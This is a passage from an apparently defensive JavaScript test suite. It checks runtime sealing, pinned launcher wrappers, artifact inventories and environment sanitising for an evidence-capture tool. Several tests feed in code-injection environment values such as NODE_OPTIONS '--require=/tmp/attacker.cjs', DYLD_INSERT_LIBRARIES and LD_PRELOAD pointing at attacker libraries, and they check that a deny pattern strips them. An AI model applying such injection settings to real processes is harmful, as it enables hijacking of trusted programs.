        { source: realpathSync("/bin/echo"), hook: "afterCodesign" },
        { source: realpathSync("/bin/echo"), hook: "beforeTargetPublication" },
        { source: realpathSync("/opt/homebrew/opt/zstd/lib/libzstd.1.dylib"), hook: "afterInstallNameTool", scratchSwap: true },
        { source: realpathSync("/bin/echo"), hook: "afterCodesign", scratchSwap: true },
      ];
      for (const [index, testCase] of cases.entries()) {
        const directory = realpathSync(mkdtempSync(join(tmpdir(), `relayer-mutator-swap-${index}-`)));
        const target = join(directory, testCase.hook === "afterInstallNameTool" ? "libzstd.1.dylib" : basename(testCase.source));
        copyFileSync(testCase.source, target);
        chmodSync(target, 0o700);
        const sourceSha256 = createHash("sha256").update(readFileSync(testCase.source)).digest("hex");
        const targetAuthority = captureExactRegularFileIdentity(target);
        const swap = (_target, scratch) => {
          const swappedPath = testCase.scratchSwap ? scratch : target;
          renameSync(swappedPath, `${swappedPath}.captured`);
          copyFileSync(testCase.scratchSwap ? "/bin/cat" : testCase.source, swappedPath);
        };
        try {
          expect(() => sealMachORuntimeCopies({
            sourceSpecs: [{ source: testCase.source, target, sourceSha256, targetAuthority }],
            runtimeRoot: directory,
            rootExecutable: target,
            otoolPath,
            installNameToolPath,
            [testCase.hook]: swap,
          })).toThrow(/changed during mutation|no longer resolves to its held file|dependency inventory differs|content payload differs|load-command vector differs|fixed header differs/);
          if (testCase.scratchSwap) {
            expect(createHash("sha256").update(readFileSync(target)).digest("hex")).toBe(sourceSha256);
          }
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
    },
    30_000,
  );

  it.runIf(process.platform === "darwin" && existsSync("/opt/homebrew/opt/node/bin/node"))(
    "rejects symlink and same-byte inode swaps of a private sealing target",
    () => {
      const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-seal-swap-")));
      const source = realpathSync("/opt/homebrew/opt/node/bin/node");
      const target = join(directory, "node");
      const otoolPath = resolvePinnedXcodeTool("otool");
      const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
      const sourceSha256 = createHash("sha256").update(readFileSync(source)).digest("hex");
      try {
        copyFileSync(source, target);
        const authority = captureExactRegularFileIdentity(target);
        rmSync(target);
        symlinkSync(source, target);
        expect(() => sealMachORuntimeCopies({
          sourceSpecs: [{ source, target, sourceSha256, targetAuthority: authority }],
          runtimeRoot: directory,
          rootExecutable: target,
          otoolPath,
          installNameToolPath,
        })).toThrow(/exact regular file|changed during mutation/);
        rmSync(target);
        copyFileSync(source, target);
        const originalAuthority = captureExactRegularFileIdentity(target);
        rmSync(target);
        copyFileSync(source, target);
        expect(() => sealMachORuntimeCopies({
          sourceSpecs: [{ source, target, sourceSha256, targetAuthority: originalAuthority }],
          runtimeRoot: directory,
          rootExecutable: target,
          otoolPath,
          installNameToolPath,
        })).toThrow("changed during mutation");
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }
    },
    30_000,
  );

  it("rejects malformed, mixed, and duplicate otool architecture sections", () => {
    const executable = "/tmp/fat-tool";
    const dependency = "\t/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1.0.0)";
    expect(() => parseOtoolLibraryDependencies(`${executable} (architecture arm64):\n${dependency}\n${executable} (architecture arm64):\n${dependency}\n`, executable))
      .toThrow("Invalid or duplicate");
    expect(() => parseOtoolLibraryDependencies(`${executable}:\n${dependency}\n${executable} (architecture arm64):\n${dependency}\n`, executable))
      .toThrow("mixed thin and architecture");
    expect(() => parseOtoolLibraryDependencies(`${executable} (architecture arm64):\n${executable} (architecture x86_64)\n`, executable))
      .toThrow("Malformed otool -L section header");
    expect(() => parseOtoolLibraryDependencies(`${executable} (architecture arm64):\n\t/usr/lib/libSystem.B.dylib\n`, executable))
      .toThrow("Malformed otool -L dependency");
  });

  it.runIf(process.platform === "darwin")("parses the installed universal Xcode libtool closure", () => {
    const executable = realpathSync(execFileSync("/usr/bin/xcrun", ["--find", "libtool"], { encoding: "utf8" }).trim());
    const output = execFileSync("/usr/bin/otool", ["-L", executable], { encoding: "utf8" });
    expect(parseOtoolLibraryDependencies(output, executable)).toEqual([
      "/usr/lib/libSystem.B.dylib",
      "/usr/lib/libc++.1.dylib",
    ]);
  });
  it.runIf(process.platform !== "win32")("executes the provider through the exact pinned Node, wrapper, and Codex paths", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-test-"));
    try {
      const codexPath = join(directory, "fake'codex");
      const pidFile = join(directory, "provider'pid");
      const wrapperPath = join(directory, "codex-provider-wrapper");
      writeFileSync(codexPath, "#!/bin/sh\nprintf '%s|%s\\n' \"$$\" \"$1\"\n", { mode: 0o700 });
      writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
        nodePath: process.execPath,
        codexPath,
        pidFile,
      }), { mode: 0o700 });
      chmodSync(wrapperPath, 0o700);

      const output = execFileSync(wrapperPath, ["forwarded argument"], { encoding: "utf8" }).trim();
      const [executedPid, argument] = output.split("|");
      expect(readFileSync(pidFile, "utf8").trim()).toBe(executedPid);
      expect(argument).toBe("forwarded argument");
      expect(readFileSync(wrapperPath, "utf8").split("\n")[0]).toBe(`#!${process.execPath}`);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("rejects provider-wrapper paths that cannot be pinned safely", () => {
    expect(() => createPinnedProviderWrapperScript({
      nodePath: "/tmp/node with spaces",
      codexPath: "/tmp/codex",
      pidFile: "/tmp/provider.pid",
    })).toThrow("shebang interpreter");
    expect(() => createPinnedProviderWrapperScript({
      nodePath: "/usr/bin/node",
      codexPath: "codex",
      pidFile: "/tmp/provider.pid",
    })).toThrow("absolute single-line path");
  });

  it.runIf(process.platform !== "win32")("terminates promptly when the pinned Codex executable cannot start", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-failure-test-"));
    try {
      const wrapperPath = join(directory, "codex-provider-wrapper");
      writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
        nodePath: process.execPath,
        codexPath: join(directory, "missing-codex"),
        pidFile: join(directory, "provider.pid"),
      }), { mode: 0o700 });
      const result = spawnSync(wrapperPath, [], { encoding: "utf8", timeout: 1_000 });
      expect(result.error).toBeUndefined();
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("ENOENT");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== "win32")("force-terminates a pinned provider child that ignores graceful shutdown", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-force-test-"));
    const codexPath = join(directory, "stuck-codex");
    const pidFile = join(directory, "provider.pid");
    const wrapperPath = join(directory, "codex-provider-wrapper");
    let wrapper;
    let providerPid;
    try {
      writeFileSync(codexPath, [
        `#!${process.execPath}`,
        'process.on("SIGTERM", () => {});',
        "setInterval(() => {}, 1_000);",
        "",
      ].join("\n"), { mode: 0o700 });
      writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
        nodePath: process.execPath,
        codexPath,
        pidFile,
      }), { mode: 0o700 });
      wrapper = spawn(wrapperPath, [], { stdio: "ignore" });
      await vi.waitFor(() => expect(readFileSync(pidFile, "utf8").trim()).toMatch(/^\d+$/));
      providerPid = Number(readFileSync(pidFile, "utf8").trim());

      process.kill(wrapper.pid, "SIGUSR2");
      const exit = await new Promise((resolve, reject) => {
        const timeout = setTimeout(() => reject(new Error("provider wrapper did not exit after force-close")), 1_000);
        wrapper.once("exit", (code, signal) => {
          clearTimeout(timeout);
          resolve({ code, signal });
        });
      });

      expect(exit).toEqual({ code: null, signal: "SIGKILL" });
      expect(() => process.kill(providerPid, 0)).toThrow();
    } finally {
      try { if (providerPid) process.kill(providerPid, "SIGKILL"); } catch {}
      try { if (wrapper?.pid) process.kill(wrapper.pid, "SIGKILL"); } catch {}
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== "win32")("kills the spawned Codex process when provider PID publication fails", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-pid-failure-test-"));
    try {
      const codexPath = join(directory, "fake-codex");
      const wrapperPath = join(directory, "codex-provider-wrapper");
      writeFileSync(codexPath, "#!/bin/sh\nwhile :; do sleep 1; done\n", { mode: 0o700 });
      writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
        nodePath: process.execPath,
        codexPath,
        pidFile: directory,
      }), { mode: 0o700 });

      const result = spawnSync(wrapperPath, [], { encoding: "utf8", timeout: 2_000 });
      expect(result.error).toBeUndefined();
      expect(result.status).toBe(1);
      expect(result.signal).toBeNull();
      const childPid = Number(result.stderr.match(/Failed to publish Codex provider PID (\d+):/)?.[1]);
      expect(Number.isSafeInteger(childPid)).toBe(true);
      expect(() => process.kill(childPid, 0)).toThrow(expect.objectContaining({ code: "ESRCH" }));
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("copies and inventories the provider wrapper and its interpreter before selecting the SDK executable", () => {
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain('const nodePath = join(snapshotRoot, "node");');
    expect(capture).toContain('key: "codex-provider-wrapper",\n    source: providerWrapperSource');
    expect(capture.indexOf("await prepareProviderWrapperSource(snapshotRoot);")).toBeLessThan(
      capture.indexOf('"source runtime inventory"'),
    );
    expect(capture.indexOf('"source runtime inventory"')).toBeLessThan(
      capture.indexOf("() => prepareImmutableRuntime(capturedSourceRuntimeArtifacts)"),
    );
    expect(capture).toContain('providerWrapper = specs.find((spec) => spec.key === "codex-provider-wrapper").source;');
    expect(capture).toContain("codexPathOverride: providerWrapper");
  });

  it("preauthorizes only the pinned no-argument graph-authoring launcher", () => {
    expect(createPinnedGraphAuthoringExecPolicy("/private/tmp/runtime/graph-authoring-launcher")).toBe(
      'prefix_rule(pattern=["/private/tmp/runtime/graph-authoring-launcher"], decision="allow")\n',
    );
    expect(() => createPinnedGraphAuthoringExecPolicy("relative/launcher")).toThrow(/safe absolute launcher path/);
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain('createPinnedGraphAuthoringExecPolicy(graphAuthoringLauncher)');
    expect(capture).not.toContain('prefix_rule(pattern=["/bin/zsh", "-lc"]');
  });

  it("restores copied read-only runtime directories before deleting the evidence workspace", () => {
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain("await captureReadOnlyDirectoryAuthorities(target, runtimeSnapshotReadOnlyDirectoryAuthorities);");
    expect(capture).toContain("...runtimeSnapshotReadOnlyDirectoryAuthorities");
    expect(capture).toContain("Fresh build or runtime snapshot directory authority changed before cleanup.");
  });

  it("binds immutable runtime copies to a pre-copy clean source revision and inventory", () => {
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    const cleanGate = capture.indexOf("const sourceCommit = cleanSourceRevision(sourceGit, sourceRepositoryRoot);");
    expect(cleanGate).toBeGreaterThan(-1);
    expect(cleanGate).toBeLessThan(capture.indexOf('execFileSync("/usr/bin/ditto"'));
    expect(cleanGate).toBeLessThan(capture.indexOf("const bootstrapControls = new Map"));
    expect(capture).toContain("() => runtimeArtifactInventory(sourceRuntimeArtifactSpecs)");
    expect(capture).toContain("() => prepareImmutableRuntime(capturedSourceRuntimeArtifacts)");
    expect(capture).toContain("Immutable runtime copies do not match their inventoried source bytes.");
    expect(capture).toContain("await verifySourceInventoryMatchesRevision(sourceRuntimeArtifacts);");
    expect(capture).toContain("runtimeArtifactInventorySha256");
    expect(capture).toContain('const SYSTEM_GIT_PATH = "/usr/bin/git";');
    expect(capture).toContain('const SYSTEM_SANDBOX_EXEC_PATH = "/usr/bin/sandbox-exec";');
    expect(capture).toContain('{ key: "sandbox-exec", source: SOURCE_SANDBOX_EXEC_PATH, label: "<sandbox-executable>", copy: false, provenance: "external", discoveredSha256: discoveredMachOSha256(SOURCE_SANDBOX_EXEC_PATH), allowHardlinks: sealedSystemHardlinkPolicy(SOURCE_SANDBOX_EXEC_PATH) }');
    expect(capture).toContain('target: "graph-authoring-network.sb"');
    expect(capture).toContain("sandboxExecPath: SOURCE_SANDBOX_EXEC_PATH");
    expect(capture).toContain('networkProfilePath: join(canonicalSnapshotRoot, "graph-authoring-network.sb")');
    expect(capture).not.toContain('process.env.RELAYER_GIT_PATH || "git"');
  });

  it("strips runtime injection overrides before launching the authenticated Electron bootstrap", () => {
    expect(sanitizeElectronBootstrapEnvironment({
      SAFE_BOOTSTRAP_VALUE: "retained",
      NODE_OPTIONS: "--require=/tmp/attacker.cjs --experimental-loader=/tmp/attacker.mjs",
      node_path: "/tmp/hostile-modules",
      NODE_REPL_EXTERNAL_MODULE: "/tmp/repl-loader.mjs",
      NODE_EXTRA_CA_CERTS: "/tmp/hostile-ca.pem",
      ELECTRON_RUN_AS_NODE: "1",
      electron_no_asar: "1",
      DYLD_INSERT_LIBRARIES: "/tmp/attacker.dylib",
      ld_preload: "/tmp/attacker.so",
      LD_AUDIT: "/tmp/attacker-audit.so",
      OPENSSL_CONF: "/tmp/hostile-openssl.cnf",
      openssl_modules: "/tmp/hostile-modules",
      OpEnSsL_EnGiNeS: "/tmp/hostile-engines",
      OMITTED_VALUE: undefined,
    })).toEqual({ SAFE_BOOTSTRAP_VALUE: "retained" });
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain("return sanitizeElectronBootstrapEnvironment(process.env);");
    expect(capture).toContain("...bootstrapEnvironment(),");
    expect(capture).not.toContain("...process.env,\n        [IMMUTABLE_ELECTRON_ROOT]");
  });

  it("starts the first Electron process through a preload-free trusted Node launcher", async () => {
    const packageJson = JSON.parse(readFileSync(join(import.meta.dirname, "..", "package.json"), "utf8"));
    const command = packageJson.scripts["evidence:ask-profile"];
    expect(command).toBeUndefined();

    const launcher = join(import.meta.dirname, "..", "scripts", "launch-ask-profile-evidence.sh");
    const launcherSource = readFileSync(launcher, "utf8");
    const completedUnsetLoop = launcherSource.indexOf("IFS=$saved_ifs");
    expect(completedUnsetLoop).toBeGreaterThan(0);
    expect(launcherSource.indexOf("set -eu")).toBeGreaterThan(completedUnsetLoop);
    expect(launcherSource.indexOf("/usr/bin/", completedUnsetLoop)).toBeGreaterThan(completedUnsetLoop);
    expect(launcherSource.slice(0, completedUnsetLoop)).not.toContain("/usr/bin/");
    expect(launcherSource).toContain("node_path=${1:-}");
    expect(launcherSource).not.toContain("npm_cli_path=${2:-}");
    expect(launcherSource).not.toContain("npm run build");
    expect(launcherSource).not.toContain("npm_node_execpath");
    expect(launcherSource).not.toContain('exec "$npm_node_execpath"');
    expect(launcherSource).toContain('rev-parse "$source_commit:$control_file"');
    expect(launcherSource).toContain('hash-object --no-filters "$repository_root/$control_file"');
    expect(launcherSource).toContain('GIT_NO_REPLACE_OBJECTS=1');
    expect(launcherSource).toContain('show "$source_commit:$control_file" > "$bootstrap_root/$control_file"');
    expect(launcherSource).toContain('exec 3< "$bootstrap_root/scripts/launch-ask-profile-evidence.mjs"');
    expect(launcherSource).toContain('/bin/rm "$bootstrap_root/scripts/launch-ask-profile-evidence.mjs"');
    expect(launcherSource).toContain('exec "$node_path" --input-type=module - "$bootstrap_root" "$repository_root" "$source_commit" <&3');
    expect(launcherSource).not.toContain("script_directory=$(pwd -P)/scripts");
    if (process.platform === "darwin") {
      const probe = execFileSync("/bin/sh", [launcher], {
        encoding: "utf8",
        env: {
          SAFE_VALUE: "retained",
          RELAYER_ASK_PROFILE_LAUNCHER_PROBE: "1",
          NODE_OPTIONS: "--require=/tmp/attacker.cjs",
          NoDe_FUTURE_OVERRIDE: "/tmp/future-node-hook",
          electron_override_dist_path: "/tmp/hostile-electron",
          ElEcTrOn_FuTuRe_Override: "/tmp/future-electron-hook",
          DYLD_INSERT_LIBRARIES: "/tmp/attacker.dylib",
          DyLd_FuTuRe_Override: "/tmp/future-dyld-hook",
          ld_preload: "/tmp/attacker.so",
          Ld_FuTuRe_Override: "/tmp/future-ld-hook",
          npm_node_execpath: "/tmp/hostile-node",
          npm_execpath: "/tmp/hostile-npm-cli.js",
          OPENSSL_CONF: "/tmp/hostile-openssl.cnf",
          openssl_modules: "/tmp/hostile-modules",
          OpEnSsL_EnGiNeS: "/tmp/hostile-engines",
        },
      });
      expect(probe).toContain("SAFE_VALUE=retained");
      const probeNames = probe.trim().split("\n").map((line) => line.slice(0, line.indexOf("=")));
      expect(probeNames.some((name) => /^(?:NODE_|NPM_|ELECTRON_|DYLD_|LD_|OPENSSL_)/i.test(name))).toBe(false);

      const unrelatedCwd = mkdtempSync(join(tmpdir(), "relayer-launcher-cwd-"));
      try {
        const pathProbe = execFileSync("/bin/sh", [launcher], {
          cwd: unrelatedCwd,
          encoding: "utf8",
          env: { RELAYER_ASK_PROFILE_PATH_PROBE: "1" },
        }).trim();
        expect(pathProbe).toBe(realpathSync(join(import.meta.dirname, "..")));
      } finally {
        rmSync(unrelatedCwd, { recursive: true, force: true });
      }
    }

    const { launchAskProfileEvidence } = await import("../scripts/launch-ask-profile-evidence.mjs");
    const calls = [];
    const signalHandlers = [];
    const child = { once() { return this; }, kill() { return true; } };
    const returned = launchAskProfileEvidence({
      environment: {
        RELAYER_CAPTURE_ASK_PROFILE_EVIDENCE: "1",
        SAFE_VALUE: "retained",
        NODE_OPTIONS: "--require=/tmp/attacker.cjs",
        node_path: "/tmp/hostile-modules",
        ELECTRON_RUN_AS_NODE: "1",
        electron_override_dist_path: "/tmp/hostile-electron",
        DYLD_INSERT_LIBRARIES: "/tmp/attacker.dylib",
        ld_preload: "/tmp/attacker.so",
        OPENSSL_CONF: "/tmp/hostile-openssl.cnf",
        openssl_modules: "/tmp/hostile-modules",
        OpEnSsL_EnGiNeS: "/tmp/hostile-engines",
      },
      electronExecutable: "/trusted/Electron",
      captureScript: "/trusted/capture.mjs",
      spawnProcess: (...args) => { calls.push(args); return child; },
      signalTarget: { once: (...args) => signalHandlers.push(args) },
      controlAuthenticator: () => calls.push(["controls"]),
      electronAuthenticator: () => { calls.push(["authenticate"]); return { dev: 1n, ino: 2n, sha256: "trusted" }; },
      electronStabilityCheck: () => calls.push(["stability"]),
    });
    expect(returned).toBe(child);
    expect(calls).toEqual([["controls"], ["authenticate"], ["stability"], [
      "/trusted/Electron",
      ["/trusted/capture.mjs", "--source-repository-root", join(import.meta.dirname, ".."), "--source-commit", "HEAD"],
      {
        cwd: join(import.meta.dirname, ".."),
        env: { RELAYER_CAPTURE_ASK_PROFILE_EVIDENCE: "1", SAFE_VALUE: "retained" },
        stdio: "inherit",
      },
    ]]);
    expect(signalHandlers.map(([signal]) => signal)).toEqual(["SIGINT", "SIGTERM"]);

    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain('"launch-ask-profile-evidence.sh"');
    expect(capture).toContain('"launch-ask-profile-evidence.mjs"');
    expect(capture).toContain("...BOOTSTRAP_CONTROL_FILES.map((name) => ({");
    expect(capture.indexOf('process.argv.indexOf("--source-repository-root")'))
      .toBeLessThan(capture.indexOf("const sourceRepositoryRoot = requestedSourceRepositoryRoot()"));
  });

  it.runIf(process.platform !== "win32")("executes held launcher bytes after its pathname is removed and replaced", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-held-launcher-"));
    const launcher = join(directory, "launcher.mjs");
    let descriptor;
    try {
      writeFileSync(launcher, 'process.stdout.write("authenticated launcher bytes\\n");\n');
      descriptor = openSync(launcher, "r");
      unlinkSync(launcher);
      writeFileSync(launcher, 'process.stdout.write("replacement pathname bytes\\n");\n');
      const result = spawnSync(process.execPath, ["--input-type=module", "-"], {
        stdio: [descriptor, "pipe", "pipe"],
        encoding: "utf8",
      });
      expect(result.status).toBe(0);
      expect(result.stdout).toBe("authenticated launcher bytes\n");
      expect(result.stderr).toBe("");
    } finally {
      if (descriptor !== undefined) closeSync(descriptor);
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("resolves the installed Electron executable using the host platform layout", async () => {
    const { resolveInstalledElectronExecutable } = await import("../scripts/launch-ask-profile-evidence.mjs");
    const executable = resolveInstalledElectronExecutable();
    if (process.platform === "darwin") {
      expect(executable).toContain("Electron.app/Contents/MacOS/Electron");
    } else if (process.platform === "win32") {
      expect(basename(executable).toLowerCase()).toBe("electron.exe");
    } else {
      expect(basename(executable)).toBe("electron");
    }
  });

  it.runIf(process.platform === "darwin")("ignores Git replacement refs while authenticating snapshotted bootstrap controls", async () => {
    const fixture = mkdtempSync(join(tmpdir(), "relayer-bootstrap-replace-"));
    const executedBootstrapRoot = mkdtempSync(join(tmpdir(), "relayer-bootstrap-snapshot-"));
    const controlFiles = [
      "package.json",
      "package-lock.json",
      "scripts/launch-ask-profile-evidence.sh",
      "scripts/launch-ask-profile-evidence.mjs",
      "scripts/capture-ask-profile-evidence.mjs",
      "scripts/ask-profile-evidence-model.mjs",
      "scripts/evidence-capture-integrity.mjs",
    ];
    try {
      mkdirSync(join(fixture, "scripts"));
      mkdirSync(join(executedBootstrapRoot, "scripts"));
      for (const path of controlFiles) {
        writeFileSync(join(fixture, path), `committed ${path}\n`);
        writeFileSync(join(executedBootstrapRoot, path), `committed ${path}\n`);
      }
      const git = (args) => execFileSync("/usr/bin/git", args, { cwd: fixture, encoding: "utf8" }).trim();
      git(["init", "-q"]);
      git(["config", "user.name", "Bootstrap Test"]);
      git(["config", "user.email", "bootstrap@example.invalid"]);
      git(["add", "."]);
      git(["commit", "-qm", "committed controls"]);
      const originalCommit = git(["rev-parse", "HEAD"]);
      const branch = git(["symbolic-ref", "--short", "HEAD"]);
      writeFileSync(join(fixture, "package.json"), "replacement-controlled bytes\n");
      git(["add", "package.json"]);
      git(["commit", "-qm", "replacement commit"]);
      const replacementCommit = git(["rev-parse", "HEAD"]);
      git(["update-ref", `refs/heads/${branch}`, originalCommit]);
      git(["replace", originalCommit, replacementCommit]);

      const { authenticateBootstrapControls } = await import("../scripts/launch-ask-profile-evidence.mjs");
      expect(() => authenticateBootstrapControls({ sourceRepositoryRoot: fixture, executedBootstrapRoot, sourceCommit: originalCommit }))
        .not.toThrow();
    } finally {
      rmSync(fixture, { recursive: true, force: true });
      rmSync(executedBootstrapRoot, { recursive: true, force: true });
    }
  });

  it.runIf(fileSymlinksSupported)("rejects graph-client symlinks before immutable runtime preparation", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-graph-client-symlink-"));
    const graphClientRoot = join(directory, "graph-client");
    const privateFile = join(directory, "private.txt");
    try {
      mkdirSync(join(graphClientRoot, "dist"), { recursive: true });
      writeFileSync(join(graphClientRoot, "package.json"), "{}\n");
      writeFileSync(privateFile, "private material must not enter graph authority\n");
      symlinkSync(privateFile, join(graphClientRoot, "dist", "outside-secret"));

      await expect(inventoryRegularArtifactTree({
        root: graphClientRoot,
        label: "packages/graph-client",
      })).rejects.toThrow("symbolic link");
      await expect(inventoryRegularArtifactTree({
        root: graphClientRoot,
        label: "packages/graph-client",
        allowContainedSymlinks: true,
      })).rejects.toThrow("escapes its declared root");

      const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
      expect(capture.indexOf('"source runtime inventory"')).toBeLessThan(capture.indexOf('"immutable desktop module loading"'));
      expect(capture).toContain("inventoryRegularArtifactTree");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(Boolean(posixMkfifo))("rejects FIFO and other non-regular artifact entries without reading them", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-artifact-fifo-"));
    const fifo = join(directory, "provider-output");
    try {
      execFileSync(posixMkfifo, [fifo]);
      await expect(Promise.race([
        inventoryRegularArtifactTree({ root: directory, label: "runtime" }),
        new Promise((_resolve, reject) => setTimeout(() => reject(new Error("inventory blocked on FIFO")), 1_000)),
      ])).rejects.toThrow("not a regular file");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("rejects an external hardlink inside the graph-client authority tree", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-graph-client-hardlink-"));
    const graphClientRoot = join(directory, "graph-client");
    const privateFile = join(directory, "private.txt");
    try {
      mkdirSync(join(graphClientRoot, "dist"), { recursive: true });
      writeFileSync(privateFile, "private hardlinked material\n");
      linkSync(privateFile, join(graphClientRoot, "dist", "outside-secret"));

      await expect(inventoryRegularArtifactTree({
        root: graphClientRoot,
        label: "packages/graph-client",
      })).rejects.toThrow("multiply-linked regular file");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")("inventories the real sealed-system Git hardlinks without weakening private trees", async () => {
    const gitDetails = await import("node:fs/promises").then(({ stat }) => stat("/usr/bin/git"));
    expect(gitDetails.nlink).toBeGreaterThan(1);
    await expect(inventoryRegularArtifactTree({
      root: "/usr/bin/git",
      label: "<build-tool>/git",
      allowHardlinks: true,
    })).resolves.toEqual([expect.objectContaining({
      file: "<build-tool>/git",
      bytes: expect.any(Number),
      sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
    })]);

    const directory = mkdtempSync(join(tmpdir(), "relayer-private-hardlink-policy-"));
    try {
      writeFileSync(join(directory, "tool"), "private tool\n");
      await expect(inventoryRegularArtifactTree({
        root: join(directory, "tool"),
        label: "<private-tool>",
        allowHardlinks: true,
      })).rejects.toThrow("restricted to sealed system and Xcode inputs");

      const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
      expect(capture).toContain('{ source: sourceClangResourceDirectory, label: "<build-tool>/clang-resource", recordSymlinks: true, allowHardlinks: true }');
      expect(capture).toContain("allowHardlinks: spec.allowHardlinks === true");
      expect(capture).toContain("source: target, allowHardlinks: false");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(Boolean(multiplyLinkedHomebrewNode))("accepts a multiply-linked Homebrew Node only as a non-executed copy source", async () => {
    const nodePath = multiplyLinkedHomebrewNode;
    expect(statSync(nodePath).nlink).toBeGreaterThan(1);
    await expect(inventoryRegularArtifactTree({
      root: nodePath,
      label: "<external-node-copy-source>",
    })).rejects.toThrow("multiply-linked regular file");
    await expect(inventoryRegularArtifactTree({
      root: nodePath,
      label: "<external-node-copy-source>",
      allowExternalCopySourceHardlinks: true,
    })).resolves.toEqual([expect.objectContaining({
      file: "<external-node-copy-source>",
      sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
    })]);

    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain("const pinnedBuildNode = await preparePinnedBuildNodeRuntime();");
    expect(capture).toContain("runSandboxed(profile, pinnedBuildNode.nodePath");
    expect(capture).toContain("DYLD_LIBRARY_PATH: pinnedBuildNode.root");
    expect(capture).toContain("Private Node closure copy does not match its authenticated external source bytes.");
    expect(capture).toContain("allowExternalCopySourceHardlinks: false");
  });

  it("fails closed if a hardlink alias mutates an external copy source during authentication", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-external-node-alias-"));
    const source = join(directory, "node");
    const alias = join(directory, "node-alias");
    try {
      writeFileSync(source, Buffer.alloc(1024, 0x41));
      linkSync(source, alias);
      const before = await inventoryRegularArtifactTree({
        root: source,
        label: "<external-node-copy-source>",
        allowExternalCopySourceHardlinks: true,
      });
      writeFileSync(alias, "mutated through a hardlink alias\n");
      const after = await inventoryRegularArtifactTree({
        root: source,
        label: "<external-node-copy-source>",
        allowExternalCopySourceHardlinks: true,
      });
      expect(after).not.toEqual(before);
      const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
      expect(capture).toContain("JSON.stringify(afterIdentities) !== JSON.stringify(beforeIdentities)");
      expect(capture).toContain("JSON.stringify(after) !== JSON.stringify(before)");
      expect(capture).toContain("External Node closure changed while its private copy was prepared.");
      await expect(inventoryRegularArtifactTree({
        root: directory,
        label: "<external-node-directory>",
        allowExternalCopySourceHardlinks: true,
      })).rejects.toThrow("requires one exact regular source file");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("fails closed when a hardlink alias appears and mutates a file during inventory", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-artifact-hardlink-race-"));
    const payload = join(directory, "payload.bin");
    const outsideAlias = join(dirname(directory), `${basename(directory)}-alias`);
    try {
      writeFileSync(payload, Buffer.alloc(16 * 1024 * 1024, 0x41));
      const inventory = inventoryRegularArtifactTree({ root: directory, label: "runtime" });
      const rejection = expect(inventory).rejects.toThrow(/multiply-linked regular file|changed while it was inventoried/);
      await new Promise((resolveMutation) => setImmediate(() => {
        linkSync(payload, outsideAlias);
        writeFileSync(outsideAlias, "mutated through external alias\n");
        resolveMutation();
      }));
      await rejection;
    } finally {
      rmSync(outsideAlias, { force: true });
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("inventories a normal regular artifact tree deterministically", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-regular-artifacts-"));
    try {
      mkdirSync(join(directory, "nested"));
      writeFileSync(join(directory, "z.txt"), "last\n");
      writeFileSync(join(directory, "nested", "a.txt"), "first\n");
      await expect(inventoryRegularArtifactTree({ root: directory, label: "runtime" })).resolves.toEqual([
        {
          file: "runtime/nested/a.txt",
          bytes: 6,
          sha256: createHash("sha256").update("first\n").digest("hex"),
        },
        {
          file: "runtime/z.txt",
          bytes: 5,
          sha256: createHash("sha256").update("last\n").digest("hex"),
        },
      ]);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("rejects an absolute ambient git.exe as commit-object authority", () => {
    const gitPath = join(tmpdir(), "ambient", "git.exe");
